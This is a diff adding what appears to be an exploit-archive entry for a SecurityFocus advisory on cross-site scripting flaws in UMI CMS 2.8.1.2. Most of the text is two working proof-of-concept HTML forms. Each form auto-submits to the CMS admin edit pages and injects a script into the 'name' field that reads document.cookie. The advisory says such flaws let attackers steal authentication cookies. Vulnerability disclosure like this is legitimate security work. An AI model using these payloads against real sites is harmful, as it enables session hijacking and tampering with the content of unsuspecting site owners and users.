@@ -1,0 +1,47 @@
+source: http://www.securityfocus.com/bid/46280/info
+
+UMI CMS is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+UMI CMS 2.8.1.2 is vulnerable; other versions may also be affected.
+
+<form action="http://host/admin/news/edit/PAGEID/do/" method="post" name="main" enctype="multipart/form-data" >
+<input type="hidden" name="referer" value="hello">
+<input type="hidden" name="domain" value="host">
+<input type="hidden" name="name" value=&#039;news"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="alt-name" value="altname">
+<input type="hidden" name="active" value="0">
+<input type="hidden" name="active" value="1">
+<input type="hidden" name="type-id" value="23">
+<input type="hidden" name="save-mode" value="Save">
+<input type="hidden" name="template-id" value="2">
+<input type="hidden" name="is-visible" value="0">
+<input type="hidden" name="is-default" value="0">
+<input type="hidden" name="perms_read[2373]" value="1">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+<form action="http://[host]/admin/content/edit/PAGEID/do/" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="referer" value="google">
+<input type="hidden" name="domain" value="[host]">
+<input type="hidden" name="name" value=&#039;price3"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="alt-name" value="price">
+<input type="hidden" name="active" value="0">
+<input type="hidden" name="active" value="1">
+<input type="hidden" name="type-id" value="10">
+<input type="hidden" name="save-mode" value="Save">
+<input type="hidden" name="template-id" value="2">
+<input type="hidden" name="is-visible" value="0">
+<input type="hidden" name="is-visible" value="1">
+<input type="hidden" name="is-default" value="0">
+
+</form>
+<script>
+document.main.submit();
+</script>
